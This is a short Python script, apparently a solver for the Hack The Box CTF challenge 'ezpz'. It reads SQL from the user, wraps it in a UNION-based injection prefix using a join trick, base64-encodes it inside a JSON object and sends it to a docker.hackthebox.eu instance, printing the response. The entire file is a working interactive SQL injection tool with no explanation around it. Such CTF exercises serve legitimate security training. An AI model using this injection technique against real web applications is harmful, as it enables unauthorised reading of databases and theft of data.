#!/usr/bin/env python

import requests
from base64 import b64encode
from bs4 import BeautifulSoup
import json

port = '30851' # Port of the docker instance provided by HTB

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

print(color.PURPLE + "\n[*] ezpz injector script created by XMA")
print("-----------------------------------------\n" + color.END)
while True:
	str_injection = raw_input("Enter injection: ")
	str_injection = "' union select * from (select 1)a join (" + str_injection + ")b#"
	payload = b64encode(json.dumps({"ID": str_injection.strip()}))
	url = 'http://docker.hackthebox.eu:'+port+'/index.php?obj=' + payload
	r = requests.get(url)
	soup = BeautifulSoup(r.text, 'html.parser')
	body = soup.find('body').text.strip()
	print "\n", body, "\n"
